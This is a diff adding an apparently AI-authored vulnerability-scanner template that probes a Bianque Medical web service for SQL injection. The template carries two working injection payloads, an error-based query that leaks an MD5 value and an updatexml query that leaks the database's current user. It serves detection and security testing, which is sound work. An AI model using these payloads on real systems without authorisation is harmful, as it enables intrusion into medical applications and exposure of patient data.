@@ -1,0 +1,57 @@
+id: bianque-medical-sql-injection
+
+info:
+  name: Bianque Medical SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template checks for an SQL injection vulnerability in the POST endpoint of the Bianque Medical application. The payload attempts to exploit the injection and verify it using a unique MD5 hash.
+  tags: sql-injection,medical
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: "1"
+    raw:
+      - |
+        POST /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetLyfsByParams HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate, br, zstd
+        Connection: keep-alive
+        Content-Length: 198
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.0 (KHTML, like Gecko) Chrome/24.0.809.0 Safari/534.0
+
+        strOpid=1 AND (SELECT 9054 FROM(SELECT COUNT(*),CONCAT(0x7b7e7b,(SELECT (ELT(9054=9054,1))),md5(123456),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&strTempID=1&strNumber=&strUnit=
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "e10adc3949ba59abbe56e057f20f883e" # MD5 hash of '123456'
+
+      - type: status
+        status:
+          - 200
+
+  - id: "2"
+    raw:
+      - |
+        GET /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetMonitorList?UserID=1&OperatorID=1&SearchName=string%27%26%26+updatexml(1,CONCAT_WS(1,1,current_user),1)+%26%26%27 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.0 (KHTML, like Gecko) Chrome/24.0.809.0 Safari/534.0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "current_user"
+
+      - type: status
+        status:
+          - 200
